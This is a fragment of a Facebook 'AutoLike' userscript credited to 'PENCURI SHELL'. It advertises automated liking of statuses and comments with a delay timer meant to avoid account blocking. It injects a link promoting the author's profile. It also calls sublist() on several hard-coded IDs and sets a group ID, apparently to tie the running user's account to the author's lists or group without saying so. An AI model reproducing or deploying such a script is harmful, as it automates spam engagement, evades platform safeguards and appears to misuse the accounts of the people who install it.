...
// @description		        *[ AUTOLIKE BOoM ]* AutoLike Facebook coded by PENCURI SHELL. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author			https://www.facebook.com/SyafiHaxor
// @authorURL		        
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/100005645162679' target='_blank' title='Follow' ><blink><center>Follow Developed</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
...
sublist("171080693090102");
sublist("171080759756762");
sublist("171080819756756");
sublist("171080896423415");

var gid = ['172184019647803'];
